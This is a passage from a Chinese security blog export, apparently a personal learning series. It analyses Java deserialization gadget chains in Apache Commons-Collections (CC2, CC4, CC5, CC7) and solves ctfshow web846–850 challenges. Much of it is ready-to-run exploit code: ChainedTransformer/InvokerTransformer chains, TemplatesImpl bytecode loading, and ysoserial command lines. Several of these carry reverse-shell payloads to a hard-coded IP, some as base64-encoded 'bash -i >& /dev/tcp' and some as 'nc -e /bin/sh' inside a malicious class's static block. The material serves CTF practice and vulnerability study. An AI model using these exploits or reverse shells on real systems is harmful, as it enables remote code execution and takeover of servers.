defaultedMap2.put(\"zZ\", 1);\n\n        Hashtable hashtable = new Hashtable();\n        hashtable.put(defaultedMap1, 1);\n        hashtable.put(defaultedMap2, 1);\n\n        Field iTransformers = ChainedTransformer.class.getDeclaredField(\"iTransformers\");\n        iTransformers.setAccessible(true);\n        iTransformers.set(transformerChain,transformers);\n\n        defaultedMap2.remove(\"yy\");\n        serialize(hashtable);\n        unserialize(\"CC7plus.txt\");\n    }\n    //定义序列化操作\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"CC7plus.txt\"));\n        oos.writeObject(object);\n        oos.close();\n    }\n    //将序列化字符串转为base64\n//    public static void serialize(Object object) throws Exception{\n//        ByteArrayOutputStream data = new ByteArrayOutputStream();\n//        ObjectOutputStream oos = new ObjectOutputStream(data);\n//        oos.writeObject(object);\n//        oos.close();\n//        System.out.println(Base64.getEncoder().encode(data.toByteArray()));\n//    }\n\n    //定义反序列化操作\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));\n        ois.readObject();\n    }\n}\n\n```\n\n\n\n## CC链总结\n\n到此的话CC链的7条链子也算是学完了，我学的比较慢， 总是担心记不住知识点，总会多花时间返回去看笔记然后才开始学新的知识点，陆陆续续花费了差不多大半个月的时间，也算是比较慢的了，但总体来说审链子的时候还是学到了很多东西的，这里放infer师傅的一个CC链的思维导图\n\n![CCchains](../image/achieve/202411/java学习/CCchains.jpg)\n","tags":["java反序列化"],"categories":["javasec"]},{"title":"Java反序列化CC5链","url":"/2025/06/28/Java反序列化CC5链/","content":"\n## 0x01链子分析\n\nCC5的话其实就是在CC1的入口类上做了一点改动，从CC1中利用AnnotationInvocationHandler#readObject()换成利用BadAttributeValueExpException#readObject()\n\n后半段也是沿用了CC1的LazyMap#get()后半段\n\n然后我们来看一下\n\n## 0x02版本\n\njdk：jdk8u65\nCC：Commons-Collections 3.2.1\n\n## 0x03链子寻找\n\n那我们继续倒推，找一下能调用get的方法\n\n### TiedMapEntry#getValue()\n\n发现TiedMapEntry类中的getValue方法调用了get方法\n\n```java\n    public Object getValue() {\n        return map.get(key);\n    }\n```\n\n### TiedMapEntry#toString()\n\n然后TiedMapEntry类的toString方法又调用了getValue方法\n\n```java\n    public String toString() {\n        return getKey() + \"=\" + getValue();\n    }\n```\n\n### BadAttributeValueExpException#readObject()\n\n往前推，发现在BadAttributeValueExpException的readObject方法调用了toString方法\n\n```java\n    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {\n        ObjectInputStream.GetField gf = ois.readFields();\n        Object valObj = gf.get(\"val\", null);\n\n        if (valObj == null) {\n            val = null;\n        } else if (valObj instanceof String) {\n            val= valObj;\n        } else if (System.getSecurityManager() == null\n                || valObj instanceof Long\n                || valObj instanceof Integer\n                || valObj instanceof Float\n                || valObj instanceof Double\n                || valObj instanceof Byte\n                || valObj instanceof Short\n                || valObj instanceof Boolean) {\n            val = valObj.toString();\n        } else { // the serialized object is from a version without JDK-8019292 fix\n            val = System.identityHashCode(valObj) + \"@\" + valObj.getClass().getName();\n        }\n    }\n```\n\n我们看看这里的valObj参数是否可控\n\n```java\nObjectInputStream.GetField gf = ois.readFields();\nObject valObj = gf.get(\"val\", null);\n```\n\n先调用readFields从流中读取了所有的持久化字段，然后调用get()方法得到了名字是val的字段。\n\n```java\nprivate Object val;\n```\n\n所以我们只要val变量可控那valObj就是可控的\n\n同时我们看一下该类是否接入序列化接口\n\n```java\npublic class BadAttributeValueExpException extends Exception  \npublic class Exception extends Throwable\npublic class Throwable implements Serializable\n```\n\n根据这里的继承关系可以发现是接入了序列化接口的\n\n## 0x04POC编写\n\n看一下构造方法\n\n```java\n    public BadAttributeValueExpException (Object val) {\n        this.val = val == null ? null : val.toString();\n    }\n```\n\n我发现这里也会调用toString()方法，所以这里也会触发，那可能会导致反序列化的时候不会触发，那我们用之前的方法，先在给BadAttributeValueExpException传参数的时候不传入tiedMapEntry对象，然后反射修改val的值为tiedMapEntry就行。\n\n构造函数是公共属性，那我们直接写一下poc\n\n### POC\n\n```java\npackage POC.CC5;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport javax.management.BadAttributeValueExpException;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CC5 {\n    public static void main(String[] args) throws Exception {\n        Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}),\n                new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}),\n                new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})\n        };\n        ChainedTransformer chainedTransformer =  new ChainedTransformer(transformers);\n\n        HashMap<Object,Object> map = new HashMap<>();\n        Map<Object,Object> lazyMap = LazyMap.decorate(map,chainedTransformer);\n\n        //CC5的开头\n        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,\"aaa\");\n        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);\n        \n        //反射修改val为tiedMapEntry\n        Class a = Class.forName(\"javax.management.BadAttributeValueExpException\");\n        Field valfield = a.getDeclaredField(\"val\");\n        valfield.setAccessible(true);\n        valfield.set(badAttributeValueExpException,tiedMapEntry);\n\n        //序列化和反序列化\n        serialize(badAttributeValueExpException);\n        unserialize(\"CC5.txt\");\n    }\n    //定义序列化操作\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"CC5.txt\"));\n        oos.writeObject(object);\n        oos.close();\n    }\n\n    //定义反序列化操作\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));\n        ois.readObject();\n    }\n}\n\n```\n\n\n\n","tags":["java反序列化"],"categories":["javasec"]},{"title":"ctfshow入门java反序列化","url":"/2025/06/25/ctfshow入门java反序列化/","content":"\n## web846\n\n### #URLDNS链\n\n```java\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.net.URL;\nimport java.util.Base64;\n\npublic class URLDNS {\n    public static void main(String[] args) throws Exception{\n        //构造函数中可以传入一个ip地址\n        URL url = new URL(\"http://0cc054b6-237d-45fe-806c-95d59655509c.challenge.ctf.show/\");\n        Class c = url.getClass();\n        Field hashCode = c.getDeclaredField(\"hashCode\");\n        //受保护类型，需要设置权限\n        hashCode.setAccessible(true);\n        //将URL的hashCode设置为不是-1，就不会在put的时候调用hashCode访问dns了\n        hashCode.set(url,1);\n        HashMap<URL, Integer> map = new HashMap<>();\n        map.put(url, 1);\n        //将URL的hashCode设置为-1，是为了在反序列化的时候调用URL的hashCode访问dns\n        hashCode.set(url,-1);\n        serialize(map);\n    }\n\n    public static void serialize(Object object) throws Exception{\n        ByteArrayOutputStream data = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(data);\n        oos.writeObject(object);\n        oos.close();\n        System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));\n    }\n}\n```\n\n然后将base64编码的字符串进行url编码后传入就行了\n\n当然也可以用工具[ysoserial](https://github.com/frohoff/ysoserial)\n\n```java\njava -jar ysoserial-[version]-all.jar [payload] '[command]'\n```\n\n```java\njava -jar ysoserial-all.jar URLDNS \"http://68fa5a21-03f5-46eb-9d5f-f8bd5e5e793a.challenge.ctf.show/\"|base64\n```\n\n## web847\n\n### #CC1链\n\n环境是java7和commons-collections 3.1\n\n直接打CC1，不会的可以去看我审链子的文章[Java反序列化CC1链](https://wanth3f1ag.top/2025/05/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE/)\n\n打反弹shell的exp\n\n```java\npackage POC.CC1;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.*;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.util.Base64;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CC1 {\n    public static void main(String[] args) throws Exception {\n\n        Transformer[] Transformer = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getDeclaredMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n                new InvokerTransformer(\"invoke\",new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n                new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjI1LjE4Ni8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}\"}),\n        };\n        Transformer transformerChain = new ChainedTransformer(Transformer);\n        Map innerMap = new HashMap();\n        Map outerMap = LazyMap.decorate(innerMap, transformerChain);\n        Class<?> clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);\n        construct.setAccessible(true);\n        InvocationHandler handler = (InvocationHandler) construct.newInstance(Override.class, outerMap);\n\n        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);\n        handler = (InvocationHandler) construct.newInstance(Override.class, proxyMap);\n\n        serialize(handler);\n        //unserialize(\"CC1.txt\");\n\n    }\n    public static void serialize(Object obj) throws IOException {\n        ByteArrayOutputStream data =new ByteArrayOutputStream();\n        ObjectOutput oos =new ObjectOutputStream(data);\n        oos.writeObject(obj);\n        oos.flush();\n        oos.close();\n        System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));\n    }\n}\n```\n\nysoserial工具payload\n\n```java\njava -jar ysoserial-all.jar CommonsCollections1 \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjI1LjE4Ni8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}\"|base64\n```\n\n## web848\n\n### #CC6链or其他\n\n这里禁止了TransformedMap类反序列化，可以用CC6的链子，或者用CC1另一条LazyMap的get方法触发链\n\n```java\npackage POC.CC6;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.util.Base64;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CC6 {\n    public static void main(String[] args) throws Exception {\n        Transformer[] Transformer = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getDeclaredMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n                new InvokerTransformer(\"invoke\",new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n                new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjI1LjE4Ni8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}\"}),\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(Transformer);\n        Map<Object,Object> lazyMap = LazyMap.decorate(new HashMap<>(),new ConstantTransformer(\"1\"));\n\n        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,\"2\");\n        HashMap<Object,Object> hashmap = new HashMap<>();\n        hashmap.put(tiedMapEntry, \"3\");\n        lazyMap.remove(\"2\");\n\n        //反射修改值\n        Class<LazyMap> lazyMapClass = LazyMap.class;\n        Field factory = lazyMapClass.getDeclaredField(\"factory\");\n        factory.setAccessible(true);\n        factory.set(lazyMap, chainedTransformer);\n\n        serialize(hashmap);\n\n    }\n    public static void serialize(Object obj) throws IOException {\n        ByteArrayOutputStream data =new ByteArrayOutputStream();\n        ObjectOutput oos =new ObjectOutputStream(data);\n        oos.writeObject(obj);\n        oos.flush();\n        oos.close();\n        System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));\n    }\n\n}\n```\n\n当然也可以用用工具ysoserial\n\n```java\njava -jar ysoserial-all.jar CommonsCollections6 \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjI1LjE4Ni8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}\"|base64\n```\n\n## web849\n\n### #CC4链orCC2链\n\n这次是用的Common-collection4.0版本，直接打CC4或者CC2就行\n\n需要nc反弹\n\n```java\nnc ip port -e /bin/sh\n```\n\n所以我们的EXP（以CC4为例）\n\n```java\npackage POC.CC4;\n\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.Base64;\nimport java.util.PriorityQueue;\nimport javax.xml.transform.Templates;\nimport java.io.*;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.collections4.Transformer;\nimport org.apache.commons.collections4.functors.ChainedTransformer;\nimport org.apache.commons.collections4.functors.ConstantTransformer;\nimport org.apache.commons.collections4.functors.InstantiateTransformer;\nimport org.apache.commons.collections4.comparators.TransformingComparator;\n\npublic class CC4 {\n    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {\n        TemplatesImpl templates = new TemplatesImpl();\n        setFieldValue(templates,\"_name\",\"a\");\n\n        byte[] code = Files.readAllBytes(Paths.get(\"E:\\\\java\\\\JavaSec\\\\CC1\\\\target\\\\classes\\\\POC\\\\CC3\\\\URLClassLoader_test.class\"));\n        byte[][] codes = {code};\n        setFieldValue(templates,\"_bytecodes\",codes);\n\n        setFieldValue(templates,\"_tfactory\",new TransformerFactoryImpl());\n\n        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});\n\n        Transformer[] transformers = new Transformer[] {\n                new ConstantTransformer(TrAXFilter.class),\n                instantiateTransformer\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));\n        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);\n        //方法一：修改size值\n//        Class priorityqueue = priorityQueue.getClass();\n//        Field size = priorityqueue.getDeclaredField(\"size\");\n//        size.setAccessible(true);\n//        size.set(priorityQueue, 2);\n\n        //方法二：add方法触发链\n        priorityQueue.add(1);\n        priorityQueue.add(2);\n        Class t = transformingComparator.getClass();\n        Field transformerField = t.getDeclaredField(\"transformer\");\n        transformerField.setAccessible(true);\n        transformerField.set(transformingComparator,chainedTransformer);\n\n        serialize(priorityQueue);\n//        unserialize(\"CC4.txt\");\n    }\n    public static void setFieldValue(Object object, String field_name, Object field_value) throws NoSuchFieldException, IllegalAccessException{\n        Class c = object.getClass();\n        Field field = c.getDeclaredField(field_name);\n        field.setAccessible(true);\n        field.set(object, field_value);\n    }\n    //定义序列化操作\n    public static void serialize(Object obj) throws IOException {\n        ByteArrayOutputStream data =new ByteArrayOutputStream();\n        ObjectOutput oos =new ObjectOutputStream(data);\n        oos.writeObject(obj);\n        oos.flush();\n        oos.close();\n        System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));\n    }\n\n    //定义反序列化操作\n    public static void unserialize(String filename) throws IOException, ClassNotFoundException{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));\n        ois.readObject();\n    }\n}\n```\n\n在需要加载的类中的内容\n\n```java\npackage POC.CC3;\n\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;\nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\n\nimport java.io.IOException;\n\npublic class URLClassLoader_test extends AbstractTranslet {\n    static {\n        try {\n            Runtime.getRuntime().exec(\"nc 124.223.25.186 2333 -e /bin/sh\");\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n    @Override\n    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n\n    }\n\n    @Override\n    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\n\n    }\n}\n\n```\n\n然后生成payload并传入就行，CC2也是一样的\n\nysoserial的payload\n\n```java\njava -jar ysoserial-all.jar CommonsCollections4 \"nc 124.223.25.186 2333 -e /bin/sh\"|base64\njava -jar ysoserial-all.jar CommonsCollections2 \"nc 124.223.25.186 2333 -e /bin/sh\"|base64\n```\n\n## web850\n\n### #CC3链\n\n因为这里的话使用了**commons-collections 3.1**的库并对一些可能有危险的类进行了封禁，所以直接用CC3就行，CC3可以绕过Runtime类禁用的情况\n\n加载类的代码还是849的那个不过命令是bash反弹shell，然后就是我们CC3的POC\n\n```java\njava -jar ysoserial-all.jar CommonsCollections3 \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjI1LjE4Ni8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}\"|base64\n```\n\n但是不知道为什么，自己写的利用链一直打不通，去分析一下ysoserial的源码也没整明白，后面回来再补吧\n\n## web851\n\n\n\n\n\n\n\n","tags":["java反序列化"],"categories":["ctfshow"]},{"title":"Java反序列化CC2链","url":"/2025/06/25/Java反序列化CC2链/","content":"\n参考infer师傅的文章：https://infernity.top/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC2%E9%93%BE/\n\n其实本质上和CC4没区别，只不过CC2在CC4的基础上从利用InstantiateTransformer类的基础上改成了直接使用InvokerTransformer，其他没变，也就是CC3的POC2，直接去触发newTransformer()\n\n原有的CC4的POC\n\n```java\nTransformer[] transformers = new Transformer[] {\n        new ConstantTransformer(TrAXFilter.class),\n        instantiateTransformer\n};\nChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n```\n\n改成直接利用InvokerTransformer\n\n```java\nInvokerTransformer<Object,Object> invokerTransformer = new InvokerTransformer<>(\"newTransformer\", new Class[]{}, new Object[]{});\n```\n\n然后把TemplatesImpl类的对象从传入InstantiateTransformer改成直接add进priorityQueue里。\n\n```java\nCC4：\npriorityQueue.add(1);\nCC2：\npriorityQueue.add(templates);\n```\n\n所以最后的POC\n\n## 最终POC\n\n```java\npackage SerializeChains.CCchains.CC2;\n\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.PriorityQueue;\nimport java.io.*;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport org.apache.commons.collections4.functors.ConstantTransformer;\nimport org.apache.commons.collections4.comparators.TransformingComparator;\nimport org.apache.commons.collections4.functors.InvokerTransformer;\n\npublic class CC2 {\n    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {\n        TemplatesImpl templates = new TemplatesImpl();\n\n        //修改_name的值\n        setFieldValue(templates,\"_name\",\"a\");\n\n        //修改_bytecodes的值\n        byte[] code = Files.readAllBytes(Paths.get(\"E:\\\\java\\\\JavaSec\\\\JavaSerialize\\\\target\\\\classes\\\\SerializeChains\\\\CCchains\\\\CC3\\\\POC.class\"));\n        byte[][] codes = {code};\n        setFieldValue(templates,\"_bytecodes\",codes);\n\n        InvokerTransformer<Object,Object> invokerTransformer = new InvokerTransformer<>(\"newTransformer\", new Class[]{}, new Object[]{});\n        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));\n        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);\n\n        priorityQueue.add(templates);\n        priorityQueue.add(2);\n\n        setFieldValue(transformingComparator,\"transformer\",invokerTransformer);\n\n        serialize(priorityQueue);\n        unserialize(\"CC2.txt\");\n    }\n    public static void setFieldValue(Object object, String field_name, Object field_value) throws NoSuchFieldException, IllegalAccessException{\n        Class c = object.getClass();\n        Field field = c.getDeclaredField(field_name);\n        field.setAccessible(true);\n        field.set(object, field_value);\n    }\n    //定义序列化操作\n    public static void serialize(Object object) throws IOException {\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"CC2.txt\"));\n        oos.writeObject(object);\n        oos.close();\n    }\n\n    //定义反序列化操作\n    public static void unserialize(String filename) throws IOException, ClassNotFoundException{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));\n        ois.readObject();\n    }\n}\n\n```\n\n","tags":["java反序列化"],"categories":["javasec"]},{"title":"Java反序列化CC4链","url":"/2025/06/25/Java反序列化CC4链/","content":"\n## 0x01漏洞分析\n\nCC4其实就是CommonsCollections4版本的反序列化漏洞的链子，而之前的CC1、CC3、CC6都是用的CommonsCollections <= 3.1.2的版本，我们这里就不过多介绍了\n\n## 0x02影响版本&环境搭建\n\n**CC：Commons-Collections 4.0**\n\n**jdk版本：jdk8u65**\n\n环境搭建的话，直接在之前的maven项目的pom.xml中添加版本就行\n\n```xml\n    <dependency>\n      <groupId>org.apache.commons</groupId>\n      <artifactId>commons-collections4</artifactId>\n      <version>4.0</version>\n    </dependency>\n```\n\n## 0x03链子分析\n\nhttps://infernity.top/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC4%E9%93%BE/\n\n其实CC4说白了也算是另一个分支路线，调用tranform()执行代码，而CC4中是用TransformingComparator#compare() 调用\n\n由于TransformingComparator类在commons-collections3没有实现序列化接口，而commons-collections4实现了，所以才有CC4链的存在。\n\n首先我们看一下tranform()方法的用法，找到TransformingComparator#compare()方法\n\n### TransformingComparator#compare()\n\n![image-20250625202231287](../image/achieve/202411/java学习/image-20250625202231287.png)\n\n```java\n    public int compare(final I obj1, final I obj2) {\n        final O value1 = this.transformer.transform(obj1);\n        final O value2 = this.transformer.transform(obj2);\n        return this.decorated.compare(value1, value2);\n    }\n```\n\n按照常规思路我们得看看这里的变量可不可控\n\n```java\n    public TransformingComparator(final Transformer<? super I, ? extends O> transformer,\n                                  final Comparator<O> decorated) {\n        this.decorated = decorated;\n        this.transformer = transformer;\n    }\n```\n\n构造方法是公开属性的，属性是可控的，那我们看一下谁调用了compare()方法\n\n### PriorityQueue#siftDownUsingComparator()\n\n在PriorityQueue类里的siftDownUsingComparator方法调用了compare方法\n\n```java\n    private void siftDownUsingComparator(int k, E x) {\n        int half = size >>> 1;\n        while (k < half) {\n            int child = (k << 1) + 1;\n            Object c = queue[child];\n            int right = child + 1;\n            if (right < size &&\n                comparator.compare((E) c, (E) queue[right]) > 0)\n                c = queue[child = right];\n            if (comparator.compare(x, (E) c) <= 0)\n                break;\n            queue[k] = c;\n            k = child;\n        }\n        queue[k] = x;\n    }\n```\n\n私有属性，**并且comparator可控**，从公开属性的构造方法中可以看出\n\n```java\n    public PriorityQueue(int initialCapacity,\n                         Comparator<? super E> comparator) {\n        // Note: This restriction of at least one is not actually needed,\n        // but continues for 1.5 compatibility\n        if (initialCapacity < 1)\n            throw new IllegalArgumentException();\n        this.queue = new Object[initialCapacity];\n        this.comparator = comparator;\n    }\n```\n\n看看有没有能调用他的，在本类的siftDown()方法中找到用法\n\n### PriorityQueue#siftDown() \n\n```java\n    private void siftDown(int k, E x) {\n        if (comparator != null)\n            siftDownUsingComparator(k, x);\n        else\n            siftDownComparable(k, x);\n    }\n```\n\n也是私有属性，我们继续往前找\n\n### PriorityQueue#heapify()\n\n在本类的heapify()方法下有调用\n\n```java\n    private void heapify() {\n        for (int i = (size >>> 1) - 1; i >= 0; i--)\n            siftDown(i, (E) queue[i]);\n    }\n```\n\n也是私有属性，继续往前摸，在本类的readObject()方法下找到\n\n### PriorityQueue#readObject()\n\n```java\n    private void readObject(java.io.ObjectInputStream s)\n        throws java.io.IOException, ClassNotFoundException {\n        // Read in size, and any hidden stuff\n        s.defaultReadObject();\n\n        // Read in (and discard) array length\n        s.readInt();\n\n        queue = new Object[size];\n\n        // Read in all elements.\n        for (int i = 0; i < size; i++)\n            queue[i] = s.readObject();\n\n        // Elements are guaranteed to be in \"proper order\", but the\n        // spec has never explained what that might be.\n        heapify();\n    }\n```\n\n所以我们的链子是这样的\n\n## 最终的链子\n\n```java\nPriorityQueue#readObject()->\n      PriorityQueue#heapify()->\n        PriorityQueue#siftDown()->    \n            PriorityQueue#siftDownUsingComparator()->\n                    TransformingComparator#compare()->\n    \t\t\t\t\t\t\n    \t\t\t\t\t//CC3后半段\n    \t\t\t\t\tChainedTransformer#transform()->\n                        \tInstantiateTransformer#transform()->\n                            \t\tTemplatesImpl#newTransformer()->\n                                \t\tdefineClass()->newInstance()->\n```\n\n## 0x04EXP编写\n\n在PriorityQueue类中是接入了序列化接口的，所以我们可以直接new一个对象，但是我们先看一下readObject()的逻辑\n\n```java\n    private void readObject(java.io.ObjectInputStream s)\n        throws java.io.IOException, ClassNotFoundException {\n        // Read in size, and any hidden stuff\n        s.defaultReadObject();\n\n        // Read in (and discard) array length\n        s.readInt();\n\n        queue = new Object[size];\n\n        // Read in all elements.\n        for (int i = 0; i < size; i++)\n            queue[i] = s.readObject();\n\n        // Elements are guaranteed to be in \"proper order\", but the\n        // spec has never explained what that might be.\n        heapify();\n    }\n```\n\n如果需要到达heapify()的话，我们先结合CC3的后半段写个demo调试一下\n\n```java\npackage POC.CC4;\n\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.PriorityQueue;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.collections4.Transformer;\nimport org.apache.commons.collections4.functors.ChainedTransformer;\nimport org.apache.commons.collections4.functors.ConstantTransformer;\nimport org.apache.commons.collections4.functors.InstantiateTransformer;\nimport org.apache.commons.collections4.comparators.TransformingComparator;\n\nimport javax.xml.transform.Templates;\nimport java.io.*;\n\n\npublic class CC4 {\n    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {\n        TemplatesImpl templates = new TemplatesImpl();\n        setFieldValue(templates,\"_name\",\"a\");\n\n        byte[] code = Files.readAllBytes(Paths.get(\"E:\\\\java\\\\JavaSec\\\\CC1\\\\target\\\\classes\\\\POC\\\\CC3\\\\URLClassLoader_test.class\"));\n        byte[][] codes = {code};\n        setFieldValue(templates,\"_bytecodes\",codes);\n\n        setFieldValue(templates,\"_tfactory\",new TransformerFactoryImpl());\n\n        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});\n\n        Transformer[] transformers = new Transformer[] {\n                new ConstantTransformer(TrAXFilter.class),\n                instantiateTransformer\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n        \n        //CC4前半段\n        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);\n        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);\n        serialize(priorityQueue);\n        unserialize(\"CC4.txt\");\n    }\n    public static void setFieldValue(Object object, String field_name, Object field_value) throws NoSuchFieldException, IllegalAccessException{\n        Class c = object.getClass();\n        Field field = c.getDeclaredField(field_name);\n        field.setAccessible(true);\n        field.set(object, field_value);\n    }\n    //定义序列化操作\n    public static void serialize(Object object) throws IOException {\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"CC4.txt\"));\n        oos.writeObject(object);\n        oos.close();\n    }\n\n    //定义反序列化操作\n    public static void unserialize(String filename) throws IOException, ClassNotFoundException{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));\n        ois.readObject();\n    }\n}\n```\n\n打断点调试一下\n\n### heapify()中size赋值问题\n\n![image-20250625213250602](../image/achieve/202411/java学习/image-20250625213250602.png)\n\n但是这里并不能进入siftDown方法，因为这个方法中的size是为0的，没办法进入for循环语句，我们看一下这个for循环的内容\n\n```java\nfor (int i = (size >>> 1) - 1; i >= 0; i--)\n            siftDown(i, (E) queue[i]);\n```\n\n`int i = (size >>> 1) - 1`并且初始的i需要大于等于0才能开始循环，然后可以看到size是私有属性，我们尝试去进行赋值\n\n#### 方法一：用反射去进行赋值\n\n因为这里通过反推可以算出size最小值为2，那我们设置size为2\n\n```java\nPriorityQueue priorityQueue = new PriorityQueue(transformingComparator);\nClass priorityqueue = priorityQueue.getClass();\nField size = priorityqueue.getDeclaredField(\"size\");\nsize.setAccessible(true);\nsize.set(priorityQueue, 2);\n```\n\n修改之后的POC\n\n## 最终的POC1\n\n```java\npackage POC.CC4;\n\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.PriorityQueue;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport 